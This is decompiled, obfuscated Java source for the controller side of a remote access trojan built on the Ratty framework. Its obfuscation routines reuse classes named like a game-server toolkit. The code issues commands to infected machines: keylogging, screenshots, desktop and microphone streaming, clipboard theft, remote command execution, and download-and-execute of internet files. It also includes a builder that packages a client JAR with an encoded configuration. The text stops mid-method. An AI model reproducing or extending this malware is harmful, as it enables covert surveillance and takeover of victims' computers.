/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import FuckingHackerToby.B;
import FuckingHackerToby.Ba;
import FuckingHackerToby.Ca;
import FuckingHackerToby.Da;
import FuckingHackerToby.Ea;
import FuckingHackerToby.Ga;
import FuckingHackerToby.Ia;
import FuckingHackerToby.J;
import FuckingHackerToby.Ja;
import FuckingHackerToby.K;
import FuckingHackerToby.Ka;
import FuckingHackerToby.La;
import FuckingHackerToby.Na;
import FuckingHackerToby.O;
import FuckingHackerToby.P;
import FuckingHackerToby.Q;
import FuckingHackerToby.R;
import FuckingHackerToby.S;
import FuckingHackerToby.Tc;
import FuckingHackerToby.V;
import FuckingHackerToby.W;
import FuckingHackerToby.Y;
import FuckingHackerToby.a;
import FuckingHackerToby.ca;
import FuckingHackerToby.da;
import FuckingHackerToby.e;
import FuckingHackerToby.g;
import FuckingHackerToby.ga;
import FuckingHackerToby.h;
import FuckingHackerToby.ha;
import FuckingHackerToby.j;
import FuckingHackerToby.la;
import FuckingHackerToby.ma;
import FuckingHackerToby.p;
import FuckingHackerToby.q;
import FuckingHackerToby.t;
import FuckingHackerToby.ta;
import FuckingHackerToby.u;
import FuckingHackerToby.v;
import FuckingHackerToby.y;
import FuckingHackerToby.za;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.File;
import java.net.URL;
import java.nio.file.Path;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import tools.packet.MTSCSPacket;
import tools.wztosql.DumpMapName;

public final class sa
extends AbstractRattyController
implements a {
    private static final /* synthetic */ String P = "The client will not be available anymore.\r\nContinue?";
    private /* synthetic */ File v;
    private static final /* synthetic */ String g = "   [%s]   ";
    private static final /* synthetic */ String E = "http://www.geojoe.co.uk/api/flag/?ip=";
    private static final /* synthetic */ String S = "data";
    private static final /* synthetic */ String[] Z;
    private static final /* synthetic */ String M = "User name";
    private static final /* synthetic */ String I = "Host name";
    private static final /* synthetic */ long K = 7500L;
    private static final /* synthetic */ long k = 5000L;
    private static final /* synthetic */ String t = "The client won't be available until the device restarts.\r\n Continue?";
    private static final /* synthetic */ String r = "%s:%s";
    private static final /* synthetic */ String m = "How often?";
    private /* synthetic */ long R;
    private /* synthetic */ h Y;
    private static final /* synthetic */ String b = "\u53d6\u6d88";
    private static final /* synthetic */ long d = 100L;
    private /* synthetic */ long N;
    private static final /* synthetic */ String j = "Last access";
    private static final /* synthetic */ String e = "RAM available";
    private static final /* synthetic */ String J = "Bytes";
    private /* synthetic */ g O;
    private static final /* synthetic */ Tc ALLATORIxDEMO;
    private static final /* synthetic */ String C = "Architecture";
    private static final /* synthetic */ String D = "Directory";
    private /* synthetic */ HashMap<ta, Na> T;
    private static final /* synthetic */ byte[] o;
    private static final /* synthetic */ String A = "File name";
    private static final /* synthetic */ String F = "Operating system";
    private static final /* synthetic */ String a = "\u2191";
    private static final /* synthetic */ String i = "Last modification";
    private static final /* synthetic */ String Q = "META-INF/MANIFEST.MF";
    private static final /* synthetic */ String w = "\u662f";
    private /* synthetic */ B s;
    private static final /* synthetic */ String c = "\u6709\u6771\u897f\u767c\u751f\u932f\u8aa4!";
    private static final /* synthetic */ String f = "Path";
    private static final /* synthetic */ String B = "/";
    private static final /* synthetic */ String L = "Date of creation";
    private /* synthetic */ J n;
    private static final /* synthetic */ String G = "\u5426";
    private static final /* synthetic */ String l = "\u8acb\u8f38\u5165URL!";
    private static final /* synthetic */ String h = "File size";
    private static final /* synthetic */ String H = "Processors available";

    private /* synthetic */ j ALLATORIxDEMO(Na a2, String a3) {
        sa a4;
        j j2 = null;
        if (a3 == "Free client") {
            j2 = a4.ALLATORIxDEMO();
            return j2;
        }
        if (a3 == "Open popup") {
            j2 = a4.ALLATORIxDEMO();
            return j2;
        }
        if (a3 == "Show clipboard") {
            j2 = new ca();
            return j2;
        }
        if (a3 == "Execute command") {
            j2 = a4.ALLATORIxDEMO();
            return j2;
        }
        if (a3 == "Take screenshot") {
            j2 = new p();
            return j2;
        }
        if (a3 == "Open website") {
            j2 = a4.ALLATORIxDEMO();
            return j2;
        }
        if (a3 == "Toggle desktop stream") {
            j2 = new Ea(true);
            return j2;
        }
        if (a3 == "Play audio") {
            j2 = a4.ALLATORIxDEMO();
            return j2;
        }
        if (a3 == "Download file") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Upload file here") {
            j2 = a4.H(a2);
            return j2;
        }
        if (a3 == "Execute file") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Delete file") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Create new directory") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Download file from the internet") {
            j2 = a4.H(a2);
            return j2;
        }
        if (a3 == "Upload and execute file") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Download and execute file from the internet") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Message sent") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Get file information") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Show client information") {
            j2 = new la();
            return j2;
        }
        if (a3 == "Uninstall client") {
            j2 = a4.ALLATORIxDEMO();
            return j2;
        }
        if (a3 == "Shut down") {
            j2 = new Q();
            return j2;
        }
        if (a3 == "Mouse pressed") {
            j2 = a4.ALLATORIxDEMO(a2, true);
            return j2;
        }
        if (a3 == "Mouse released") {
            j2 = a4.ALLATORIxDEMO(a2, false);
            return j2;
        }
        if (a3 == "Key pressed") {
            j2 = a4.ALLATORIxDEMO(a2, true);
            return j2;
        }
        if (a3 == "Key released") {
            j2 = a4.ALLATORIxDEMO(a2, false);
            return j2;
        }
        if (a3 == "Toggle microphone stream" && !a2.ALLATORIxDEMO()) {
            j2 = new R();
            return j2;
        }
        if (a3 == "Restart") {
            j2 = new V();
            return j2;
        }
        if (a3 == "ROOTS") {
            j2 = a4.ALLATORIxDEMO(a2);
            return j2;
        }
        if (a3 == "Request content") {
            j2 = a4.H(a2);
            return j2;
        }
        if (a3 == "Mouse moved") {
            j2 = a4.ALLATORIxDEMO(a2);
        }
        return j2;
    }

    private /* synthetic */ q ALLATORIxDEMO() {
        sa a2;
        if (a2.O.ALLATORIxDEMO(P, w, b) == 0) {
            return new q();
        }
        return null;
    }

    @Override
    public /* synthetic */ void packetReceived(ta a2, j a3) {
        sa a4;
        Na na2 = a4.ALLATORIxDEMO(a2);
        if (na2 == null) {
            return;
        }
        if (na2.l()) {
            boolean bl = a4.ALLATORIxDEMO(na2, a3);
            if (!bl) {
                a3.ALLATORIxDEMO(a2);
                return;
            }
        } else if (a3 instanceof Ka) {
            Ka ka2 = (Ka)a3;
            a4.ALLATORIxDEMO(na2, ka2);
        }
    }

    private /* synthetic */ y ALLATORIxDEMO(Na a2) {
        String string = ((Na)a2).a.ALLATORIxDEMO();
        if (string != null) {
            a2 = ((Na)a2).a.b() + B + string;
            return new y((String)a2);
        }
        return null;
    }

    @Override
    public /* synthetic */ void disconnected(ta a2) {
        sa a3;
        sa sa2 = a3;
        super.disconnected(a2);
        Na na2 = sa2.ALLATORIxDEMO(a2);
        if (na2 == null) {
            return;
        }
        na2.ALLATORIxDEMO();
        sa sa3 = a3;
        sa3.O.ALLATORIxDEMO(na2);
        sa3.T.remove(a2);
        Na na3 = na2;
        na2.ALLATORIxDEMO(a3);
        na3.H(false);
        na3.ALLATORIxDEMO(false);
    }

    private /* synthetic */ void E() {
        sa a2;
        sa sa2 = a2;
        String string = sa2.s.g();
        sa2.s.L(string);
    }

    private /* synthetic */ Da ALLATORIxDEMO() {
        sa a2;
        if (a2.O.ALLATORIxDEMO(t, w, b) == 0) {
            return new Da();
        }
        return null;
    }

    public static /* synthetic */ {
        o = ("Manifest-Version: 1.0" + System.lineSeparator() + "Class-Path: ." + System.lineSeparator() + "Main-Class: de.sogomn.rat.RattyClient" + System.lineSeparator() + System.lineSeparator()).getBytes();
        String[] arrstring = new String[39];
        arrstring[0] = DumpMapName.ALLATORIxDEMO("F:X4\u0018$W%");
        arrstring[1] = MTSCSPacket.ALLATORIxDEMO("IKQE\u000b^QL");
        arrstring[2] = DumpMapName.ALLATORIxDEMO(":U<X \u0018#X4");
        arrstring[3] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMzN@\u0004UXJZ@XQC@Y");
        arrstring[4] = DumpMapName.ALLATORIxDEMO("?W=Q&W4S|Z2X4i6X}F!Y#S!B:S ");
        arrstring[5] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMzOV\u0004UXJZ@XQC@Y");
        arrstring[6] = DumpMapName.ALLATORIxDEMO("?W=Q&W4S|Z2X4i=Z}F!Y#S!B:S ");
        arrstring[7] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMzXP\u0004UXJZ@XQC@Y");
        arrstring[8] = DumpMapName.ALLATORIxDEMO("?W=Q&W4S|Z2X4i'D}F!Y#S!B:S ");
        arrstring[9] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMz_N\u0004UXJZ@XQC@Y");
        arrstring[10] = DumpMapName.ALLATORIxDEMO("?W=Q&W4S|Z2X4i#Z}F!Y#S!B:S ");
        arrstring[11] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMzNN\u0004UXJZ@XQC@Y");
        arrstring[12] = DumpMapName.ALLATORIxDEMO("?W=Q&W4S|Z2X4i:B}F!Y#S!B:S ");
        arrstring[13] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMzYS\u0004UXJZ@XQC@Y");
        arrstring[14] = DumpMapName.ALLATORIxDEMO("?W=Q&W4S|Z2X4i#B}F!Y#S!B:S ");
        arrstring[15] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMzLW\u0004UXJZ@XQC@Y");
        arrstring[16] = DumpMapName.ALLATORIxDEMO("?W=Q&W4S|Z2X4i!Y}F!Y#S!B:S ");
        arrstring[17] = MTSCSPacket.ALLATORIxDEMO("FDDB_DM@\u0005IKKMzYW\u0004UXJZ@XQC@Y");
        arrstring[18] = DumpMapName.ALLATORIxDEMO("Z2X4C2Q6\u0019?W=Q\fE!i\u001fW'X}F!Y#S!B:S ");
        arrstring[19] = MTSCSPacket.ALLATORIxDEMO("N@\u0005VEBEHD\nXD^\nxD^QSvOW\\@X\u000bIIKVY");
        arrstring[20] = DumpMapName.ALLATORIxDEMO("R6\u0019 Y4Y>X|D2B|E6D%S!\u0019\u0012T B!W0B\u0001W'B*u<X'D<Z?S!\u00180Z2E ");
        arrstring[21] = MTSCSPacket.ALLATORIxDEMO("N@\u0005VEBEHD\nXD^\nY@XSOW\u0005dIQCSOvOW\\@X\u000bIIKVY");
        arrstring[22] = DumpMapName.ALLATORIxDEMO("R6\u0019 Y4Y>X|D2B|E6D%S!\u0019\u001ae6D%S!y1E6D%S!\u00180Z2E ");
        arrstring[23] = MTSCSPacket.ALLATORIxDEMO("AO\nYJMJGK\u0005WKQ\u0005B_L\u0005ly@XSOWfLYQmPC\u000bIIKVY");
        arrstring[24] = DumpMapName.ALLATORIxDEMO("7S|E<Q<[=\u0019!W'\u00194C:\u0019\u001ad2B'O\u0014C:\u00180Z2E ");
        arrstring[25] = MTSCSPacket.ALLATORIxDEMO("N@\u0005VEBEHD\nXD^\nMPC\nccCIOgXJ]VOWmPC\u000bIIKVY");
        arrstring[26] = DumpMapName.ALLATORIxDEMO("7S|E<Q<[=\u0019!W'\u00194C:\u0019\u001at&_?R6D\u0014C:\u00180Z2E ");
        arrstring[27] = MTSCSPacket.ALLATORIxDEMO("AO\nYJMJGK\u0005WKQ\u0005B_L\u0005ldJ^LLLID^LEKmPC\u000bIIKVY");
        arrstring[28] = DumpMapName.ALLATORIxDEMO("R6\u0019 Y4Y>X|D2B|Q&_|e6D%S!u?_6X'\u00180Z2E ");
        arrstring[29] = MTSCSPacket.ALLATORIxDEMO("AO\nYJMJGK\u0005WKQ\u0005B_L\u0005wKQ^\\mPCfEK^WEIF@X\u000bIIKVY");
        arrstring[30] = DumpMapName.ALLATORIxDEMO("7S|E<Q<[=\u0019!W'\u00194C:\u0019 A:X4\u0019\u0011C:Z7S!e$_=Q\u0014C:\u00180Z2E ");
        arrstring[31] = MTSCSPacket.ALLATORIxDEMO("N@\u0005VEBEHD\nXD^\nMPC\nYRCKM\nnLYUFDSv]LDBmPC\u000bIIKVY");
        arrstring[32] = DumpMapName.ALLATORIxDEMO("7S|E<Q<[=\u0019!W'\u00194C:\u0019 A:X4\u0019\u0015_?S\u0011D<A S!e$_=Q\u0014C:\u00180Z2E ");
        arrstring[33] = MTSCSPacket.ALLATORIxDEMO("N@\u0005VEBEHD\nXD^\nMPC\nYRCKM\nfJMBCKMv]LDBmPC\u000bIIKVY");
        arrstring[34] = DumpMapName.ALLATORIxDEMO("R6\u0019 Y4Y>X|D2B|Q&_|E$_=Q|x<B:P:U2B:Y=e$_=Q\u0014C:\u00180Z2E ");
        arrstring[35] = MTSCSPacket.ALLATORIxDEMO("N@\u0005VEBEHD\nXD^\nMPC\nYRCKM\nxD^QSv]LDBmPC\u000bIIKVY");
        arrstring[36] = DumpMapName.ALLATORIxDEMO("R6\u0019 Y4Y>X|D2B|Q&_|E$_=Q|d2B'O\u0000A:X4q&_\u0015W0B<D*\u00180Z2E ");
        arrstring[37] = MTSCSPacket.ALLATORIxDEMO("AO\nYJMJGK\u0005WKQ\u0005B_L\u0005V]LDB\u0005vOW\\@XfFLOK^qKGF@gJN@F\u000bIIKVY");
        arrstring[38] = DumpMapName.ALLATORIxDEMO("R6\u0019 Y4Y>X|D2B|Q&_|E$_=Q|e6D%S!z:E'e$_=Q\u0014C:\u00180Z2E ");
        Z = arrstring;
        ALLATORIxDEMO = Tc.H(MTSCSPacket.ALLATORIxDEMO("AO\nX@YJ_WI@\u0005UCKM\u000b]D\\"));
        ALLATORIxDEMO.H(-7.5f);
        ALLATORIxDEMO.ALLATORIxDEMO(35000.0f);
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, S a32) {
        Na na2;
        S s2 = a32;
        int a32 = s2.ALLATORIxDEMO();
        a32 = s2.ALLATORIxDEMO() == 0 ? 1 : 0;
        Object object = "";
        if ("".length() > 1) {
            if (a32 == 0) {
                object = (String)object + a;
            }
            Object[] arrobject = new Object[1];
            arrobject[0] = object;
            object = String.format(g, arrobject);
            na2 = a2;
        } else {
            if (a32 == 0) {
                return;
            }
            na2 = a2;
        }
        na2.ALLATORIxDEMO.b((String)object);
    }

    private /* synthetic */ P H(Na a2) {
        Object object = ((Na)a2).a.H();
        if (object != null) {
            File file = object;
            object = file.getName();
            byte[] arrby = za.ALLATORIxDEMO(file.getAbsolutePath());
            a2 = ((Na)a2).a.b() + B + (String)object;
            return new P((String)a2, arrby);
        }
        return null;
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, Ea a3) {
        if (!a2.H()) {
            return;
        }
        a3 = a3.ALLATORIxDEMO();
        int n2 = a3.H();
        int n3 = a3.ALLATORIxDEMO();
        Ea ea2 = new Ea();
        Na na2 = a2;
        na2.k.H(ea2);
        na2.K.ALLATORIxDEMO(n2, n3, a3);
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(String a2, Object a3) {
        sa a4;
        Object object;
        Na na2;
        Na na3;
        if (a3 instanceof Na) {
            na2 = na3 = (Na)a3;
        } else if (a3 instanceof g) {
            object = (g)a3;
            na2 = na3 = object.ALLATORIxDEMO();
        } else {
            na2 = na3 = null;
        }
        if (na2 != null) {
            object = a4.ALLATORIxDEMO(na3, a2);
            if (object != null) {
                na3.k.H((j)object);
            }
            a4.ALLATORIxDEMO(na3, a2);
        }
        a4.ALLATORIxDEMO(a2);
    }

    private /* synthetic */ La H(Na a2) {
        Na na2 = a2;
        Object object = na2.a.I();
        if (!na2.a.l((String)object)) {
            return null;
        }
        Na na3 = a2;
        a2 = na3.a.E();
        object = new La((String)a2);
        na3.a.d();
        na3.a.c((String)a2);
        return object;
    }

    public /* synthetic */ sa(h a2) {
        sa a3;
        a3.Y = a2;
        Thread thread = new Thread(() -> {
            while (true) {
                sa a2;
                W w2 = new W();
                a2.broadcast(w2);
                try {
                    Thread.sleep(5000L);
                    continue;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                    continue;
                }
                break;
            }
        }, DumpMapName.ALLATORIxDEMO("f:X4"));
        sa sa2 = a3;
        sa sa3 = a3;
        h h2 = a2;
        a3.O = h2.ALLATORIxDEMO();
        sa3.s = h2.ALLATORIxDEMO();
        sa3.n = a2.ALLATORIxDEMO();
        sa2.T = new HashMap();
        a3.n.H(a3);
        sa2.n.ALLATORIxDEMO(FuckingHackerToby.e.U);
        sa2.s.H(a3);
        sa2.s.ALLATORIxDEMO(FuckingHackerToby.e.U);
        sa2.O.H(a3);
        sa2.O.ALLATORIxDEMO(true);
        Thread thread2 = thread;
        thread2.setPriority(1);
        thread.setDaemon(true);
        thread2.start();
    }

    private /* synthetic */ void I(Na a2) {
        sa a3;
        Na na2 = a2;
        na2.H(!na2.H());
        a3.O.H();
    }

    private /* synthetic */ ha ALLATORIxDEMO(Na a2) {
        a2 = ((Na)a2).a.E();
        return new ha((String)a2);
    }

    private /* synthetic */ void D() {
        Object object;
        sa a2;
        Iterator<Na> iterator = a2.T.values().iterator();
        Iterator<Na> iterator2 = iterator;
        while (iterator2.hasNext()) {
            object = iterator.next();
            iterator2 = iterator;
            Na na2 = object;
            na2.l();
            na2.ALLATORIxDEMO();
        }
        sa sa2 = a2;
        sa2.T.clear();
        iterator = sa2.connections.iterator();
        Iterator<Object> iterator3 = iterator;
        while (iterator3.hasNext()) {
            object = (ta)((Object)iterator.next());
            iterator3 = iterator;
            Object object2 = object;
            ((ta)object2).ALLATORIxDEMO((IConnectionObserver)null);
            ((ta)object2).close();
        }
        sa sa3 = a2;
        sa3.connections.clear();
        iterator = sa3.servers.iterator();
        Iterator<Object> iterator4 = iterator;
        while (iterator4.hasNext()) {
            object = (ActiveServer)((Object)iterator.next());
            iterator4 = iterator;
            Object object3 = object;
            ((ActiveServer)object3).setObserver(null);
            ((ActiveServer)object3).close();
        }
        sa sa4 = a2;
        sa4.n.l();
        sa4.n.ALLATORIxDEMO();
        sa4.s.l();
        sa4.s.ALLATORIxDEMO();
        sa4.O.l();
        sa4.O.ALLATORIxDEMO();
        sa4.servers.clear();
        System.exit(0);
    }

    private /* synthetic */ Ja ALLATORIxDEMO() {
        sa a2;
        String string = a2.O.ALLATORIxDEMO();
        if (string != null) {
            return new Ja(string);
        }
        return null;
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, O a3) {
        int n2;
        a3 = a3.ALLATORIxDEMO();
        int n3 = a3.length;
        int n4 = n2 = 0;
        while (n4 < n3) {
            String string = a3[n2];
            a2.a.B(string);
            n4 = ++n2;
        }
        a2.a.H();
    }

    private /* synthetic */ La ALLATORIxDEMO(Na a2) {
        String string = a2.a.D();
        if (string == null) {
            return null;
        }
        La la2 = new La(string);
        Na na2 = a2;
        na2.a.d();
        na2.a.c(string);
        return la2;
    }

    private /* synthetic */ void H() {
        sa a2;
        String string = a2.n.H();
        try {
            int n2 = Integer.parseInt(string);
            a2.stopServer(n2);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    private /* synthetic */ ma ALLATORIxDEMO(Na a2) {
        a2 = ((Na)a2).a.E();
        return new ma((String)a2);
    }

    private /* synthetic */ void ALLATORIxDEMO(la a2) {
        sa a3;
        la la2 = a2;
        a2 = la2.E();
        String string = la2.D();
        String string2 = la2.l();
        String string3 = la2.H();
        String string4 = la2.ALLATORIxDEMO();
        int n2 = la2.ALLATORIxDEMO();
        long l2 = la2.ALLATORIxDEMO();
        a2 = M + DumpMapName.ALLATORIxDEMO("\fs") + (String)a2 + MTSCSPacket.ALLATORIxDEMO("( ") + I + DumpMapName.ALLATORIxDEMO("\fs") + string + MTSCSPacket.ALLATORIxDEMO("( ") + F + DumpMapName.ALLATORIxDEMO("\fs") + string2 + " " + string3 + MTSCSPacket.ALLATORIxDEMO("( ") + C + DumpMapName.ALLATORIxDEMO("\fs") + string4 + MTSCSPacket.ALLATORIxDEMO("( ") + H + DumpMapName.ALLATORIxDEMO("\fs") + n2 + MTSCSPacket.ALLATORIxDEMO("( ") + e + DumpMapName.ALLATORIxDEMO("\fs") + l2 + " " + J + MTSCSPacket.ALLATORIxDEMO("( ");
        a3.O.ALLATORIxDEMO((String)a2);
    }

    private /* synthetic */ P ALLATORIxDEMO(Na a2) {
        sa a3;
        a2 = a3.O.H();
        if (a2 != null) {
            Object object = a2;
            a2 = ((File)object).getName();
            byte[] arrby = za.ALLATORIxDEMO(((File)object).getAbsolutePath());
            return new P((String)a2, arrby, true);
        }
        return null;
    }

    private /* synthetic */ Ca ALLATORIxDEMO(Na a2) {
        a2 = ((Na)a2).a.E();
        return new Ca((String)a2);
    }

    private /* synthetic */ Ba ALLATORIxDEMO(Na a22, boolean a3) {
        if (!a22.H()) {
            return null;
        }
        int a22 = a22.K.ALLATORIxDEMO();
        a3 = !a3;
        return new Ba(a22, (byte)a3);
    }

    private /* synthetic */ void l() {
        int n2;
        sa a2;
        block3: {
            String string = a2.n.l();
            try {
                n2 = Integer.parseInt(string);
                if (n2 > 0 && n2 <= 65535) break block3;
                return;
            }
            catch (Exception exception) {
                return;
            }
        }
        a2.startServer(n2);
    }

    private /* synthetic */ Y ALLATORIxDEMO() {
        sa a2;
        String string = a2.O.ALLATORIxDEMO();
        if (string != null) {
            return new Y(string);
        }
        return null;
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2) {
        Na na2 = a2;
        a2 = na2.a.b();
        a2 = new La((String)a2);
        na2.a.d();
        na2.k.H((j)a2);
    }

    @Override
    public /* synthetic */ void stopServer(int a2) {
        sa a3;
        String string = String.valueOf(a2);
        sa sa2 = a3;
        super.stopServer(a2);
        sa2.n.I(string);
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, La a3) {
        String string;
        int n2;
        a3 = a3.H();
        String[] arrstring = a3.ALLATORIxDEMO();
        int n3 = a3.length;
        int n4 = n2 = 0;
        while (n4 < n3) {
            string = a3[n2];
            a2.a.h(string);
            n4 = ++n2;
        }
        a3 = arrstring;
        n3 = arrstring.length;
        int n5 = n2 = 0;
        while (n5 < n3) {
            string = a3[n2];
            a2.a.G(string);
            n5 = ++n2;
        }
        a2.a.H();
    }

    private /* synthetic */ Ga ALLATORIxDEMO() {
        sa a2;
        Object object = a2.O.H(MTSCSPacket.ALLATORIxDEMO("}d|"));
        if (object != null) {
            object = za.ALLATORIxDEMO(((File)object).getAbsolutePath());
            return new Ga((byte[])object);
        }
        return null;
    }

    private /* synthetic */ u ALLATORIxDEMO(Na a22) {
        sa a3;
        if (System.currentTimeMillis() - a3.N < 100L || !a22.H()) {
            return null;
        }
        Na na2 = a22;
        int a22 = na2.K.l();
        int n2 = na2.K.H();
        a3.N = System.currentTimeMillis();
        return new u(a22, n2, 0, 3);
    }

    private /* synthetic */ void H(Na a2) {
        String string = a2.a.d();
        if (string == null) {
            return;
        }
        La la2 = new La(string);
        Na na2 = a2;
        na2.a.d();
        na2.a.c(string);
        na2.k.H(la2);
    }

    private /* synthetic */ void D(Na a2) {
        sa a3;
        Na na2 = a2;
        na2.ALLATORIxDEMO(!na2.ALLATORIxDEMO());
        a3.O.H();
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, String a3) {
        sa a4;
        if (a3 == "Browse files") {
            a4.l(a2);
            return;
        }
        if (a3 == "Closed") {
            a4.E(a2);
            return;
        }
        if (a3 == "Toggle desktop stream") {
            a4.I(a2);
            return;
        }
        if (a3 == "Toggle microphone stream") {
            a4.D(a2);
            return;
        }
        if (a3 == "Open chat") {
            a2.d.ALLATORIxDEMO(true);
            return;
        }
        if (a3 == "Open key log") {
            a2.ALLATORIxDEMO.ALLATORIxDEMO(true);
            return;
        }
        if (a3 == "Clear") {
            a2.ALLATORIxDEMO.E();
            return;
        }
        if (a3 == "Directory up") {
            a4.H(a2);
            return;
        }
        if (a3 == "Delete file") {
            a4.ALLATORIxDEMO(a2);
            return;
        }
        if (a3 == "Download file from the internet") {
            a4.ALLATORIxDEMO(a2);
            return;
        }
        if (a3 == "Create new directory") {
            a4.ALLATORIxDEMO(a2);
            return;
        }
        if (a3 == "Upload file here") {
            a4.ALLATORIxDEMO(a2);
        }
    }

    private /* synthetic */ ga H(Na a2) {
        String string = ((Na)a2).a.ALLATORIxDEMO(l);
        if (string != null) {
            a2 = ((Na)a2).a.b();
            return new ga(string, (String)a2);
        }
        return null;
    }

    private /* synthetic */ void d() {
        sa a2;
        sa sa2 = a2;
        sa2.v = sa2.s.ALLATORIxDEMO(DumpMapName.ALLATORIxDEMO("\u0019w\u0001"));
        if (sa2.v != null) {
            sa sa3 = a2;
            String string = sa3.v.getName();
            sa3.s.a(string);
            return;
        }
        a2.s.a("No file selected");
    }

    @Override
    public /* synthetic */ void closed(ActiveServer a2) {
        sa a3;
        String string = String.valueOf(a2.getPort());
        sa sa2 = a3;
        super.closed(a2);
        sa2.n.I(string);
    }

    public final /* synthetic */ Na ALLATORIxDEMO(ta a2) {
        sa a3;
        for (ta ta2 : a3.T.keySet()) {
            if (ta2 != a2) continue;
            return a3.T.get(ta2);
        }
        return null;
    }

    private /* synthetic */ void b() {
        sa sa2;
        sa a2;
        sa sa3 = a2;
        Object[] arrobject = sa3.s.ALLATORIxDEMO();
        if (sa3.v == null || arrobject.length == 0) {
            return;
        }
        byte[] arrby = Stream.of(arrobject).collect(Collectors.joining(MTSCSPacket.ALLATORIxDEMO("( "))).getBytes();
        arrobject = arrby;
        arrobject = FuckingHackerToby.K.ALLATORIxDEMO(arrby);
        arrobject = Base64.getEncoder().encode((byte[])arrobject);
        Object object = a2.v.toPath();
        object = new v((Path)object);
        ((v)object).ALLATORIxDEMO(S, (byte[])arrobject);
        ((v)object).ALLATORIxDEMO(Q, o);
        ((v)object).ALLATORIxDEMO(Z);
        try {
            ((v)object).ALLATORIxDEMO();
            sa2 = a2;
        }
        catch (Exception exception) {
            a2.O.H(c + System.lineSeparator() + exception);
            sa2 = a2;
        }
        sa2.s.b();
        a2.s.ALLATORIxDEMO(false);
    }

    @Override
    public /* synthetic */ void startServer(int a2) {
        sa a3;
        String string = String.valueOf(a2);
        sa sa2 = a3;
        boolean bl = sa2.n.ALLATORIxDEMO(string);
        super.startServer(a2);
        if (!bl) {
            sa sa3 = a3;
            sa3.n.d(string);
            sa3.n.E("");
            sa3.R = System.currentTimeMillis();
        }
    }

    private /* synthetic */ void I() {
        sa a2;
        sa sa2 = a2;
        String string = sa2.s.B();
        String string2 = sa2.s.K();
        if (string == null || string2 == null || string.isEmpty() || string2.isEmpty()) {
            return;
        }
        Object[] arrobject = new Object[2];
        arrobject[0] = string;
        arrobject[1] = string2;
        string = String.format(r, arrobject);
        sa sa3 = a2;
        sa3.s.M(string);
        sa3.s.j("");
        sa3.s.J("");
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, Ka a3) {
        sa a4;
        Ka ka2 = a3;
        a3 = ka2.l();
        String string = ka2.H();
        String string2 = ka2.ALLATORIxDEMO();
        String string3 = a2.D();
        ImageIcon imageIcon = a4.ALLATORIxDEMO(string3);
        boolean bl = System.currentTimeMillis() - a4.R > 7500L;
        sa sa2 = a4;
        a2.ALLATORIxDEMO((String)a3, string, string2, imageIcon);
        a2.H(sa2);
        sa2.O.H(a2);
        sa2.O.H();
        if (bl) {
            a4.Y.ALLATORIxDEMO((String)a3 + " " + string3, imageIcon).ALLATORIxDEMO();
            ALLATORIxDEMO.H();
        }
    }

    private /* synthetic */ ga ALLATORIxDEMO(Na a2) {
        sa a3;
        a2 = a3.O.ALLATORIxDEMO(l);
        if (a2 != null) {
            return new ga((String)a2, "", true);
        }
        return null;
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, W a3) {
        sa a4;
        a2.ALLATORIxDEMO(a3.ALLATORIxDEMO());
        a4.O.H();
    }

    private /* synthetic */ void E(Na a2) {
        sa a3;
        a2.H(false);
        a3.O.H();
    }

    private /* synthetic */ boolean ALLATORIxDEMO(Na a2, j a3) {
        sa a4;
        Class<?> class_ = a3.getClass();
        boolean bl = true;
        if (class_ == p.class) {
            p p2 = (p)a3;
            a4.ALLATORIxDEMO(a2, p2);
            return bl;
        }
        if (class_ == La.class) {
            La la2 = (La)a3;
            a4.ALLATORIxDEMO(a2, la2);
            return bl;
        }
        if (class_ == Ea.class) {
            Ea ea2 = (Ea)a3;
            a4.ALLATORIxDEMO(a2, ea2);
            return bl;
        }
        if (class_ == ca.class) {
            ca ca2 = (ca)a3;
            a4.ALLATORIxDEMO(ca2);
            return bl;
        }
        if (class_ == R.class) {
            R r2 = (R)a3;
            a4.ALLATORIxDEMO(a2, r2);
            return bl;
        }
        if (class_ == W.class) {
            W w2 = (W)a3;
            a4.ALLATORIxDEMO(a2, w2);
            return bl;
        }
        if (class_ == Ia.class) {
            Ia ia2 = (Ia)a3;
            a4.ALLATORIxDEMO(a2, ia2);
            return bl;
        }
        if (class_ == la.class) {
            la la3 = (la)a3;
            a4.ALLATORIxDEMO(la3);
            return bl;
        }
        if (class_ == ha.class) {
            ha ha2 = (ha)a3;
